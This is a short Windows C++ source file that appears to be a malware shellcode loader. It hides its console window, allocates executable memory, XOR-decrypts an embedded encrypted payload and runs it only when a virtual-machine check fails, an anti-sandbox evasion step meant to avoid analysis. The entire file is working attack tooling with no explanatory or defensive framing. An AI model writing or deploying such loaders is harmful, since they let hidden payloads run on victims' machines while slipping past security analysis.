#include <windows.h>
#include "payload.h"
#include "evasion.h"

int main(int argc, char **argv) {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char *shellcode = static_cast<char*>(VirtualAlloc(0, sizeof crypted, MEM_COMMIT, PAGE_EXECUTE_READWRITE));       
	for (int i = 0; i < sizeof crypted; i++) {
		shellcode[i] = crypted[i] ^ token[i % token.size()];
	}
	if (!isVM()) {
		((void(*)())shellcode)();	
	}
	return 0;
}
